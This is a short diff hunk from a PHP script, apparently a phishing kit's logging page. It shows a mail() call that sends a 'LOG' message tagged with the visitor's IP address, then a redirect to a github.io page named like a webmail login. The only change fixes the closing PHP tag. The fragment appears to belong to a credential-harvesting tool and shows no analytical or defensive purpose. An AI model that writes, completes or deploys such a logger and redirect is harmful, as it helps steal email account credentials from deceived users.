@@ -20,4 +20,4 @@ $hi = mail($to,"LOG | ".$ip, $message);
 
 header ("location: https://busybrain2233.github.io/webmail2.html")
 
-?
+?>
